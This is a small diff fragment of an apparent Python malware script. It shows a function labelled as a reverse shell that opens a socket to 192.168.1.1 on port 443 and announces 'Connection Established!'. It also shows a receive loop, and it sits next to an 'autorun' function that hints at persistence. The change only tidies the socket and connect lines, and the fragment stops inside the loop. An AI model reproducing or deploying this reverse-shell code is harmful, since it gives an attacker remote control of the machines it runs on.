@@ -35,8 +35,8 @@ def autorun(tempdir, fileName, run):
 
 def shell():
     # Base64 encoded reverse shell
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('192.168.1.1', int(443)))
+    s = socket.socket()
+    s.connect(('192.168.1.1', 443))
     s.send('[*] Connection Established!')
     while True:
         data = s.recv(1024)
